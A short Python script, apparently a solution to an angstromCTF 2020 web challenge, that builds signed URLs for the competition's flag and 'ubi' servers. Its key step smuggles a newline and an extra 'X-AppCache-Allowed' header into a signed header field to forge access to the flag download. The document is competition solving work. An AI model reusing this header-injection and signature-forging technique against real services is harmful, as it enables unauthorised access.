import sys
import requests
import hashlib
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
import urllib

# HOST_FLAG = "http://0.0.0.0:5001"
HOST_FLAG = "https://flags.2020.chall.actf.co"

# HOST_UBI = "http://0.0.0.0:5000"
HOST_UBI = "https://ubi.2020.chall.actf.co"

privkey = open('real_privkey', 'rb').read()
keyid = hashlib.sha256(privkey).hexdigest()
build = sys.argv[1]
key = RSA.import_key(privkey)

content_type = sys.argv[2]

# referer = 'https://flags.2020.chall.actf.co/'
referer = None
headers = {'x-ubi-src': "1\nX-AppCache-Allowed: /", 'content-type': content_type}
# headers = {'content-type': content_type}

header_string = '\n'.join(header+': '+headers[header] for header in sorted(headers.keys()))
ubi_key = SHA256.new(key.export_key('PEM', pkcs=8)+chr(10)).hexdigest()
header_string += "\nx-ubi-id: {}\nx-ubi-key: {}".format(build, ubi_key)
# print header_string
h = SHA256.new(header_string.encode('utf-8')).digest()
sig = PKCS1_OAEP.new(key).encrypt(h).encode('hex')

url = HOST_FLAG+'/download/'+build+'/flag?'+urllib.urlencode(headers)+'&sig='+sig
print url

url2 = HOST_UBI + '/' + build + '/flag?'+urllib.urlencode(headers)+'&sig='+sig
# print url2
